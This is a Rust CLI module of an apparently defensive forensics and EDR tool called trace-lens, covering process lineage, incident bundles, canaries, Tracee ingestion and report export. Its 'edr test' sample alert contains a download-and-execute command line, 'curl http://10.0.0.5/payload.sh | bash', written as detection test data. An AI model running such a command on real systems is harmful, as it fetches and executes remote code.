use std::path::PathBuf;
use std::time::Duration;
use std::{fs, io::Write};

use anyhow::Result;
use serde_json::json;
use tracing::info;
use tracing_subscriber::EnvFilter;

use crate::api::server;
use crate::cli::{CanaryCommand, Cli, Command, Ring0Command, TraceeCommand};
use crate::collector::{canary, ring0, tracee};
use crate::engine::incident::aggregate_incident_for_pid;
use crate::engine::proc_tree::{
    ProcessTree, dns_events_for_pid, file_events_for_path, file_events_for_pid,
    file_propagation_for_path, network_events_for_pid, network_events_for_target,
};
use crate::engine::trust::{assess_host_trust, assess_process_trust};
use crate::model::incident::ReplayLine;
use crate::storage::sqlite;

#[derive(Clone, Debug)]
pub struct AppState {
    pub db_path: PathBuf,
}

pub async fn run() -> Result<()> {
    init_tracing();

    let cli = <Cli as clap::Parser>::parse();

    match cli.command {
        Command::Serve {
            listen,
            db_path,
            ring0_interval_seconds,
        } => {
            sqlite::init_database(&db_path)?;
            let state = AppState {
                db_path: db_path.clone(),
            };
            spawn_ring0_scheduler(db_path, ring0_interval_seconds);
            info!("starting trace-lens http server on {listen}");
            server::run(listen, state).await
        }
        Command::InitDb { db_path } => {
            sqlite::init_database(&db_path)?;
            println!("database initialized: {}", db_path.display());
            Ok(())
        }
        Command::Status { db_path } => {
            let status = sqlite::database_status(&db_path)?;
            println!("database_path: {}", db_path.display());
            println!("database_exists: {}", status.database_exists);
            println!("schema_version: {}", status.schema_version);
            println!("raw_events: {}", status.raw_events);
            println!("processes: {}", status.processes);
            println!("incidents: {}", status.incidents);
            println!("ring0_findings: {}", status.ring0_findings);
            Ok(())
        }
        Command::Events { db_path, limit } => {
            let events = sqlite::latest_raw_events(&db_path, limit)?;
            for event in events {
                println!(
                    "{} | {} | {} | {:?} | severity={:?}",
                    event.observed_at,
                    event.event_name,
                    event.source_kind,
                    event.process_key,
                    event.severity
                );
            }
            Ok(())
        }
        Command::Ring0 { command } => match command {
            Ring0Command::Check { db_path } => {
                sqlite::init_database(&db_path)?;
                let summary = ring0::run_checks()?;
                let inserted = sqlite::insert_ring0_findings(&db_path, &summary.findings)?;
                println!(
                    "hostname: {}",
                    summary.hostname.as_deref().unwrap_or("unknown")
                );
                println!("findings_detected: {}", summary.findings.len());
                println!("findings_inserted: {}", inserted);
                for finding in summary.findings {
                    println!(
                        "{} | {} | {} | {}",
                        finding.finding_type,
                        finding.detector,
                        finding.trust_level,
                        finding.summary
                    );
                }
                Ok(())
            }
            Ring0Command::Findings { db_path, limit } => {
                let findings = sqlite::latest_ring0_findings(&db_path, limit)?;
                for finding in findings {
                    println!(
                        "{} | {} | {} | {} | {}",
                        finding.observed_at,
                        finding.finding_type,
                        finding.detector,
                        finding.trust_level,
                        finding.summary
                    );
                }
                Ok(())
            }
        },
        Command::Proc {
            pid,
            db_path,
            descendants,
            json,
        } => {
            let events = sqlite::all_raw_events(&db_path)?;
            let tree = ProcessTree::build(&events)?;
            if descendants {
                let nodes = tree.descendants_by_pid(pid, 32);
                if nodes.is_empty() {
                    println!("no descendant lineage found for pid={pid}");
                    return Ok(());
                }
                if json {
                    println!("{}", serde_json::to_string_pretty(&nodes)?);
                    return Ok(());
                }
                for node in nodes {
                    println!(
                        "pid={} ppid={:?} exe={:?} cmd={:?} start={} exit={:?}",
                        node.pid,
                        node.ppid,
                        node.exe_path,
                        node.cmdline,
                        node.start_time,
                        node.exit_time
                    );
                }
            } else {
                let ancestry = tree.ancestry_by_pid(pid, 16);

                if ancestry.is_empty() {
                    println!("no process lineage found for pid={pid}");
                    return Ok(());
                }

                let file_events = file_events_for_pid(&events, pid);
                let network_events = network_events_for_pid(&events, pid);
                let dns_events = dns_events_for_pid(&events, pid);
                let ring0_findings = sqlite::latest_ring0_findings(&db_path, 32)?;
                let process = tree.get_by_pid(pid).expect("process should exist");
                let process_trust =
                    assess_process_trust(process, &file_events, &network_events, &dns_events);
                let host_trust = assess_host_trust(&ring0_findings);

                if json {
                    let payload = serde_json::json!({
                        "ancestry": ancestry,
                        "file_events": file_events,
                        "network_events": network_events,
                        "dns_events": dns_events,
                        "process_trust": process_trust,
                        "host_trust": host_trust
                    });
                    println!("{}", serde_json::to_string_pretty(&payload)?);
                    return Ok(());
                }

                for node in ancestry {
                    println!(
                        "pid={} ppid={:?} exe={:?} cmd={:?} start={} exit={:?}",
                        node.pid,
                        node.ppid,
                        node.exe_path,
                        node.cmdline,
                        node.start_time,
                        node.exit_time
                    );
                }
                println!("trust_score: {}", process_trust.score);
                if !process_trust.reasons.is_empty() {
                    for reason in &process_trust.reasons {
                        println!("  trust_reason: {reason}");
                    }
                }
                println!("host_trust_level: {}", host_trust.level);
                for reason in &host_trust.reasons {
                    println!("  host_trust_reason: {reason}");
                }

                if !file_events.is_empty() {
                    println!("files:");
                    for event in file_events {
                        println!(
                            "  {} | {} | {} | flags={:?} | sensitive={}",
                            event.observed_at,
                            event.event_name,
                            event.file_path,
                            event.flags,
                            event.sensitive
                        );
                    }
                }

                if !network_events.is_empty() {
                    println!("network:");
                    for event in network_events {
                        println!(
                            "  {} | {} | {}:{} | external={} | lateral_hint={}",
                            event.observed_at,
                            event.event_name,
                            event.remote_addr.as_deref().unwrap_or("-"),
                            event.remote_port.unwrap_or_default(),
                            event.external,
                            event.lateral_movement_hint
                        );
                    }
                }

                if !dns_events.is_empty() {
                    println!("dns:");
                    for event in dns_events {
                        println!(
                            "  {} | {} | {} | type={:?} class={:?} | entropy={:.2} | high_entropy={}",
                            event.observed_at,
                            event.event_name,
                            event.query,
                            event.query_type,
                            event.query_class,
                            event.entropy,
                            event.high_entropy
                        );
                    }
                }
            }
            Ok(())
        }
        Command::Incident { pid, db_path, json } => {
            let raw_events = sqlite::all_raw_events(&db_path)?;
            let ring0_findings = sqlite::latest_ring0_findings(&db_path, 32)?;
            let bundle = aggregate_incident_for_pid(pid, &db_path, &raw_events, &ring0_findings)?;
            if json {
                println!("{}", serde_json::to_string_pretty(&bundle)?);
                return Ok(());
            }

            println!("incident_id: {}", bundle.incident.id);
            println!("title: {}", bundle.incident.title);
            println!("severity: {}", bundle.incident.severity);
            println!("confidence: {:.2}", bundle.incident.confidence);
            println!("status: {}", bundle.incident.status);
            println!("summary: {}", bundle.incident.summary);
            println!(
                "root_process: pid={} exe={:?}",
                bundle.root_process.pid, bundle.root_process.exe_path
            );
            println!(
                "tactics: {}",
                bundle
                    .incident
                    .tactic_tags_json
                    .unwrap_or_else(|| "[]".to_string())
            );
            println!("process_trust_score: {}", bundle.process_trust.score);
            for reason in &bundle.process_trust.reasons {
                println!("  process_trust_reason: {reason}");
            }
            println!("host_trust_level: {}", bundle.host_trust.level);
            for reason in &bundle.host_trust.reasons {
                println!("  host_trust_reason: {reason}");
            }
            println!("ancestry_nodes: {}", bundle.ancestry.len());
            println!("descendant_nodes: {}", bundle.descendants.len());
            println!("file_events: {}", bundle.file_events.len());
            println!("network_events: {}", bundle.network_events.len());
            println!("dns_events: {}", bundle.dns_events.len());
            println!("edr_evidence: {}", bundle.edr_evidence.len());
            println!("ring0_findings: {}", bundle.ring0_findings.len());
            println!("ioc_hits: {}", bundle.ioc_hits.len());
            for hit in &bundle.ioc_hits {
                println!(
                    "  ioc_hit: {} | severity={} | {} | {}",
                    hit.rule_name, hit.severity, hit.matched_value, hit.description
                );
            }
            println!("attack_tags: {}", bundle.attack_tags.len());
            for tag in &bundle.attack_tags {
                println!(
                    "  attack_tag: {} | {} | {}",
                    tag.tactic, tag.technique_hint, tag.reason
                );
            }
            for evidence in &bundle.edr_evidence {
                println!(
                    "  edr_evidence: {} | alert={:?} | pid={:?} | severity={:?} | summary={:?}",
                    evidence.event_name,
                    evidence.alert_name,
                    evidence.pid,
                    evidence.severity,
                    evidence.summary
                );
            }

            for line in bundle.summary_lines {
                println!("  - {line}");
            }
            println!("process_graph_mermaid:");
            println!("{}", bundle.process_graph_mermaid);

            Ok(())
        }
        Command::Net {
            target,
            db_path,
            json,
        } => {
            let raw_events = sqlite::all_raw_events(&db_path)?;
            let matches = network_events_for_target(&raw_events, &target);
            if matches.is_empty() {
                println!("no network events found for target={target}");
                return Ok(());
            }

            if json {
                println!("{}", serde_json::to_string_pretty(&matches)?);
                return Ok(());
            }
            for event in matches {
                println!(
                    "{} | pid={} | {} | {}:{} | external={} | lateral_hint={}",
                    event.observed_at,
                    event.pid,
                    event.event_name,
                    event.remote_addr.as_deref().unwrap_or("-"),
                    event.remote_port.unwrap_or_default(),
                    event.external,
                    event.lateral_movement_hint
                );
            }
            Ok(())
        }
        Command::File {
            path,
            db_path,
            json,
            chain,
        } => {
            let raw_events = sqlite::all_raw_events(&db_path)?;
            if chain {
                let propagation = file_propagation_for_path(&raw_events, &path);
                if propagation.write_events.is_empty() && propagation.exec_events.is_empty() {
                    println!("no propagation chain found for path={path}");
                    return Ok(());
                }
                if json {
                    println!("{}", serde_json::to_string_pretty(&propagation)?);
                    return Ok(());
                }
                println!("path: {}", propagation.path);
                println!("writes: {}", propagation.write_events.len());
                for event in propagation.write_events {
                    println!(
                        "  {} | pid={} ppid={:?} | {} | process={:?} | flags={:?} | cmd={:?}",
                        event.observed_at,
                        event.pid,
                        event.ppid,
                        event.event_name,
                        event.process_name,
                        event.flags,
                        event.cmdline
                    );
                }
                println!("executions: {}", propagation.exec_events.len());
                for event in propagation.exec_events {
                    println!(
                        "  {} | pid={} ppid={:?} | {} | process={:?} | exe={:?} | cmd={:?}",
                        event.observed_at,
                        event.pid,
                        event.ppid,
                        event.event_name,
                        event.process_name,
                        event.exe_path,
                        event.cmdline
                    );
                }
                return Ok(());
            }

            let matches = file_events_for_path(&raw_events, &path);
            if matches.is_empty() {
                println!("no file events found for path={path}");
                return Ok(());
            }

            if json {
                println!("{}", serde_json::to_string_pretty(&matches)?);
                return Ok(());
            }
            for event in matches {
                println!(
                    "{} | pid={} | {} | {} | flags={:?} | sensitive={}",
                    event.observed_at,
                    event.pid,
                    event.event_name,
                    event.file_path,
                    event.flags,
                    event.sensitive
                );
            }
            Ok(())
        }
        Command::Hunt { scope } => {
            let summary = ring0::run_checks()?;
            println!(
                "hostname: {}",
                summary.hostname.as_deref().unwrap_or("unknown")
            );
            println!("scope: {scope}");
            println!("findings_detected: {}", summary.findings.len());
            for finding in summary.findings {
                println!(
                    "{} | {} | {} | {}",
                    finding.finding_type, finding.detector, finding.trust_level, finding.summary
                );
            }
            Ok(())
        }
        Command::Export {
            format,
            pid,
            db_path,
            output_dir,
        } => {
            let raw_events = sqlite::all_raw_events(&db_path)?;
            let ring0_findings = sqlite::latest_ring0_findings(&db_path, 32)?;
            let bundle = aggregate_incident_for_pid(pid, &db_path, &raw_events, &ring0_findings)?;

            fs::create_dir_all(&output_dir)?;

            match format.as_str() {
                "report" => {
                    let report_path = output_dir.join(format!("incident-{pid}-report.md"));
                    write_markdown_report(&bundle, &report_path)?;
                    println!("report_exported: {}", report_path.display());
                }
                "timeline" => {
                    let timeline_path = output_dir.join(format!("incident-{pid}-timeline.json"));
                    write_timeline_json(&bundle, &timeline_path)?;
                    println!("timeline_exported: {}", timeline_path.display());
                }
                "package" => {
                    let package_dir = output_dir.join(format!("incident-{pid}-package"));
                    export_forensic_package(&bundle, pid, &package_dir)?;
                    println!("package_exported: {}", package_dir.display());
                }
                _ => {
                    println!("supported export formats: report | timeline | package");
                }
            }
            Ok(())
        }
        Command::Replay { incident, db_path } => {
            let raw_events = sqlite::all_raw_events(&db_path)?;
            let ring0_findings = sqlite::latest_ring0_findings(&db_path, 32)?;
            let pid = incident
                .split(':')
                .next_back()
                .and_then(|part| part.parse::<i64>().ok())
                .unwrap_or(4242);
            let bundle = aggregate_incident_for_pid(pid, &db_path, &raw_events, &ring0_findings)?;
            let timeline = build_replay_lines(&bundle);
            for line in timeline {
                println!(
                    "{} | {} | {} | {}",
                    line.observed_at, line.source, line.title, line.detail
                );
            }
            Ok(())
        }
        Command::Edr { action } => {
            let db_path = PathBuf::from("db/trace-lens.db");
            sqlite::init_database(&db_path)?;

            match action.as_str() {
                "events" => {
                    let events = sqlite::latest_edr_events(&db_path, 20)?;
                    for event in events {
                        println!(
                            "{} | {} | {} | pid={:?} | process_guid={:?} | severity={:?}",
                            event.observed_at,
                            event.vendor,
                            event.event_name,
                            event.pid,
                            event.process_guid,
                            event.severity
                        );
                    }
                    Ok(())
                }
                "alerts" => {
                    let alerts = sqlite::latest_edr_alerts(&db_path, 20)?;
                    for alert in alerts {
                        println!(
                            "{} | {} | {} | pid={:?} | severity={} | status={}",
                            alert.observed_at,
                            alert.vendor,
                            alert.alert_name,
                            alert.pid,
                            alert.severity,
                            alert.status
                        );
                    }
                    Ok(())
                }
                "test" => {
                    println!("edr_test_adapter: generic");
                    println!("edr_test_endpoint: POST /api/v1/ingest/edr/generic");
                    println!("edr_test_sample:");
                    println!(
                        r#"{{"adapter":"generic","payload":{{"event_name":"edr_process_alert","alert_name":"suspicious_bash","host_id":"blue-host","hostname":"blue","pid":4242,"process_guid":"proc-guid-1","cmdline":"bash -c curl http://10.0.0.5/payload.sh | bash","severity":8,"observed_at":1718611205,"summary":"sample edr alert"}}}}"#
                    );
                    Ok(())
                }
                _ => {
                    println!("edr actions: events | alerts | test");
                    Ok(())
                }
            }
        }
        Command::Canary { command } => match command {
            CanaryCommand::Setup => {
                let paths = canary::setup_mirror_traps()?;
                for path in paths {
                    println!("mirror_trap_created: {path}");
                }
                let ports = canary::setup_ghost_ports()?;
                if ports.is_empty() {
                    println!("ghost_port_ready: none");
                    println!(
                        "ghost_port_hint: run `trace-lens canary serve` under systemd or a dedicated terminal for foreground listeners"
                    );
                } else {
                    for port in ports {
                        println!("ghost_port_ready: {port}");
                    }
                }
                Ok(())
            }
            CanaryCommand::Serve => canary::serve_canaries(),
            CanaryCommand::Check { db_path } => {
                sqlite::init_database(&db_path)?;
                let mut findings = canary::check_mirror_traps()?;
                findings.extend(canary::check_ghost_ports()?);
                let inserted = sqlite::insert_ring0_findings(&db_path, &findings)?;
                let mirror_count = findings
                    .iter()
                    .filter(|finding| finding.finding_type == "mirror_trap_hit")
                    .count();
                let ghost_count = findings
                    .iter()
                    .filter(|finding| finding.finding_type == "ghost_port_hit")
                    .count();
                println!("mirror_trap_findings: {}", mirror_count);
                println!("ghost_port_findings: {}", ghost_count);
                println!("canary_findings_inserted: {}", inserted);
                for finding in findings {
                    println!(
                        "{} | {} | {} | {}",
                        finding.finding_type,
                        finding.detector,
                        finding.trust_level,
                        finding.summary
                    );
                }
                Ok(())
            }
        },
        Command::Tracee { command } => match command {
            TraceeCommand::Plan => {
                println!("{}", tracee::recommended_runbook());
                Ok(())
            }
            TraceeCommand::Ingest { input, db_path } => {
                sqlite::init_database(&db_path)?;
                let summary = tracee::ingest_to_db(&input, &db_path)?;
                println!("tracee_input: {}", summary.input);
                println!("read_lines: {}", summary.read_lines);
                println!("parsed_events: {}", summary.parsed_events);
                println!("inserted_events: {}", summary.inserted_events);
                Ok(())
            }
        },
    }
}

fn init_tracing() {
    let filter = EnvFilter::try_from_default_env()
        .unwrap_or_else(|_| EnvFilter::new("trace_lens=info,tower_http=info"));

    let _ = tracing_subscriber::fmt()
        .with_env_filter(filter)
        .with_target(false)
        .compact()
        .try_init();
}

fn spawn_ring0_scheduler(db_path: PathBuf, interval_seconds: u64) {
    tokio::spawn(async move {
        let mut ticker = tokio::time::interval(Duration::from_secs(interval_seconds.max(15)));

        loop {
            ticker.tick().await;
            match ring0::run_checks()
                .and_then(|summary| sqlite::insert_ring0_findings(&db_path, &summary.findings))
            {
                Ok(inserted) => {
                    if inserted > 0 {
                        info!("ring0 scheduler inserted {inserted} findings");
                    }
                }
                Err(err) => {
                    tracing::warn!("ring0 scheduler check failed: {err:#}");
                }
            }
        }
    });
}

fn build_replay_lines(bundle: &crate::engine::incident::IncidentBundle) -> Vec<ReplayLine> {
    let mut lines = Vec::new();

    for item in &bundle.file_events {
        lines.push(ReplayLine {
            observed_at: item.observed_at,
            source: "file".to_string(),
            title: item.event_name.clone(),
            detail: item.file_path.clone(),
        });
    }

    for item in &bundle.network_events {
        lines.push(ReplayLine {
            observed_at: item.observed_at,
            source: "network".to_string(),
            title: item.event_name.clone(),
            detail: format!(
                "{}:{}",
                item.remote_addr.as_deref().unwrap_or("-"),
                item.remote_port.unwrap_or_default()
            ),
        });
    }

    for item in &bundle.dns_events {
        lines.push(ReplayLine {
            observed_at: item.observed_at,
            source: "dns".to_string(),
            title: item.event_name.clone(),
            detail: format!(
                "{} type={:?} entropy={:.2} high_entropy={}",
                item.query, item.query_type, item.entropy, item.high_entropy
            ),
        });
    }

    for item in &bundle.edr_evidence {
        lines.push(ReplayLine {
            observed_at: item.observed_at,
            source: "edr".to_string(),
            title: item.event_name.clone(),
            detail: item.summary.clone().unwrap_or_else(|| item.vendor.clone()),
        });
    }

    lines.sort_by_key(|line| line.observed_at);
    lines
}

fn write_markdown_report(
    bundle: &crate::engine::incident::IncidentBundle,
    report_path: &std::path::Path,
) -> Result<()> {
    let mut file = fs::File::create(report_path)?;
    writeln!(file, "# {}", bundle.incident.title)?;
    writeln!(file)?;
    writeln!(file, "- Severity: {}", bundle.incident.severity)?;
    writeln!(file, "- Confidence: {:.2}", bundle.incident.confidence)?;
    writeln!(file, "- Host trust: {}", bundle.host_trust.level)?;
    writeln!(file, "- Summary: {}", bundle.incident.summary)?;
    writeln!(file)?;
    writeln!(file, "## Attack Narrative")?;
    for line in &bundle.summary_lines {
        writeln!(file, "- {line}")?;
    }
    writeln!(file)?;
    writeln!(file, "## ATT&CK Tags")?;
    for tag in &bundle.attack_tags {
        writeln!(
            file,
            "- {} / {}: {}",
            tag.tactic, tag.technique_hint, tag.reason
        )?;
    }
    writeln!(file)?;
    writeln!(file, "## EDR Evidence")?;
    for item in &bundle.edr_evidence {
        writeln!(
            file,
            "- {} @ {}: {}",
            item.event_name,
            item.observed_at,
            item.summary.as_deref().unwrap_or("-")
        )?;
    }
    writeln!(file)?;
    writeln!(file, "## DNS")?;
    for item in &bundle.dns_events {
        writeln!(
            file,
            "- {} @ {} type={:?} class={:?} entropy={:.2} high_entropy={}",
            item.query,
            item.observed_at,
            item.query_type,
            item.query_class,
            item.entropy,
            item.high_entropy
        )?;
    }
    writeln!(file)?;
    writeln!(file, "## Process Graph")?;
    writeln!(file, "```mermaid")?;
    writeln!(file, "{}", bundle.process_graph_mermaid)?;
    writeln!(file, "```")?;
    Ok(())
}

fn write_timeline_json(
    bundle: &crate::engine::incident::IncidentBundle,
    timeline_path: &std::path::Path,
) -> Result<()> {
    let timeline = build_replay_lines(bundle);
    fs::write(timeline_path, serde_json::to_string_pretty(&timeline)?)?;
    Ok(())
}

fn export_forensic_package(
    bundle: &crate::engine::incident::IncidentBundle,
    pid: i64,
    package_dir: &std::path::Path,
) -> Result<()> {
    fs::create_dir_all(package_dir)?;

    let report_path = package_dir.join("report.md");
    let timeline_path = package_dir.join("timeline.json");
    let incident_path = package_dir.join("incident.json");
    let ioc_hits_path = package_dir.join("ioc-hits.json");
    let attack_tags_path = package_dir.join("attack-tags.json");
    let ring0_path = package_dir.join("ring0-findings.json");
    let edr_path = package_dir.join("edr-evidence.json");
    let manifest_path = package_dir.join("manifest.json");

    write_markdown_report(bundle, &report_path)?;
    write_timeline_json(bundle, &timeline_path)?;
    fs::write(&incident_path, serde_json::to_string_pretty(bundle)?)?;
    fs::write(
        &ioc_hits_path,
        serde_json::to_string_pretty(&bundle.ioc_hits)?,
    )?;
    fs::write(
        &attack_tags_path,
        serde_json::to_string_pretty(&bundle.attack_tags)?,
    )?;
    fs::write(
        &ring0_path,
        serde_json::to_string_pretty(&bundle.ring0_findings)?,
    )?;
    fs::write(
        &edr_path,
        serde_json::to_string_pretty(&bundle.edr_evidence)?,
    )?;

    let manifest = json!({
        "incident_id": bundle.incident.id,
        "root_pid": pid,
        "title": bundle.incident.title,
        "severity": bundle.incident.severity,
        "confidence": bundle.incident.confidence,
        "host_trust_level": bundle.host_trust.level,
        "process_trust_score": bundle.process_trust.score,
        "artifacts": {
            "report": "report.md",
            "timeline": "timeline.json",
            "incident": "incident.json",
            "ioc_hits": "ioc-hits.json",
            "attack_tags": "attack-tags.json",
            "ring0_findings": "ring0-findings.json",
            "edr_evidence": "edr-evidence.json"
        },
        "counts": {
            "ancestry_nodes": bundle.ancestry.len(),
            "descendant_nodes": bundle.descendants.len(),
            "file_events": bundle.file_events.len(),
            "network_events": bundle.network_events.len(),
            "ioc_hits": bundle.ioc_hits.len(),
            "ring0_findings": bundle.ring0_findings.len(),
            "edr_evidence": bundle.edr_evidence.len()
        }
    });
    fs::write(&manifest_path, serde_json::to_string_pretty(&manifest)?)?;

    Ok(())
}
